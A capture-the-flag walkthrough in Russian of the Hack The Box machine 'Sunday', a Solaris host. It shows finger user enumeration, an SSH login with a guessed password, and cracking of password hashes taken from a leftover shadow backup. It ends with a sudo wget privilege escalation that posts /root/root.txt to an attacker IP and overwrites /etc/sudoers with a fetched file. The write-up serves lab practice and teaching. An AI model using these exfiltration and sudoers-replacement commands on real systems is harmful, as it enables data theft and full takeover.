# Sunday (HTB)

> Платформа: Hack The Box  
> ОС: Solaris  
> Сложность: Easy  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
└── Платформа Solaris

Enumeration (Finger)
├── msfconsole → scanner/finger/finger_users
└── ./finger-user-enum.pl -u root -t <target>
    └── Ответ: root ... sunday (Office Location = пароль-подсказка)

Foothold (SSH)
├── ssh -p 22022 sunny@sunday.htb → password: sunday
└── sudo -l → (root) NOPASSWD: /root/troll - ЛОВУШКА

Lateral Movement (Backup)
├── cd /backup → agent22.backup, shadow.backup
├── sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
├── sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
└── hashcat -m 7400 → sammy:cooldude!

User Flag
├── ssh -p 22022 sammy@sunday.htb (cooldude!)
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo wget)
├── sudo -l → (root) NOPASSWD: /usr/bin/wget
├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
├── Подмена /etc/sudoers:
│   ├── echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
│   └── sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
└── sudo su → root
```

---

## Machine Briefing

Solaris с Finger-сервисом на порту 79 и SSH на нестандартном порту 22022. В `/backup/` оставлена резервная копия `/etc/shadow`.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -p- sunday.htb
```

| Порт  | Сервис | Версия         |
|-------|--------|----------------|
| 79    | Finger | Finger service |
| 22022 | SSH    | OpenSSH 8.4    |

Платформа - Solaris.

---

## Enumeration (Finger)

```bash
msfconsole
use scanner/finger/finger_users
set RHOST 10.129.77.192
run
```

Найдены пользователи: `root`, `sammy`, `sunny`, `adm`, `bin`, `daemon`, `sshd`, `openldap`.

```bash
./finger-user-enum.pl -u root -t 10.129.77.192
```

```
root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     sunday
```

Поле Office Location содержит `sunday` - подсказка администратора.

---

## Foothold

```bash
ssh -p 22022 sunny@sunday.htb
# Password: sunday

sudo -l
# User sunny may run the following commands on sunday:
#     (root) NOPASSWD: /root/troll

sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

Скрипт только печатает `id`. Root shell не даёт.

---

## Lateral Movement (Backup)

```bash
cd /backup
ls
# agent22.backup  shadow.backup

cat shadow.backup
```

```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Формат `$5$` - SHA-256 crypt, hashcat mode **7400**.

```bash
echo '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' > hashes.txt
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
# cooldude!
```

**Важный нюанс:** только хеш, без `username:`.

```bash
ssh -p 22022 sammy@sunday.htb
# Password: cooldude!
cat user.txt
# <USER_FLAG>
```

---

## Privilege Escalation

```bash
sudo -l
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget
```

### Exfil root.txt

```bash
nc -lvnp 8000
sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
# <ROOT_FLAG>
```

### Полноценный root - подмена /etc/sudoers

```bash
# Kali
echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
python3 -m http.server 8000

# target
sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
sudo su
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Finger (79) - недооценённый сервис.** Не только список пользователей, но и подсказки в полях типа Office Location.
- **Нестандартные порты** - обязательно `-p-`, SSH на 22022 легко пропустить.
- **Ловушки (`troll`)** - не каждый `sudo -l` результат ведёт к реальному root.
- **Забытые backup-файлы** - `/backup/shadow.backup` даёт хеши.
- **GTFOBins для wget** - `--post-file` для эксфильтрации, `-O` для подмены системных файлов.
- **Форматирование hash-файлов** - только хеш, без метаданных.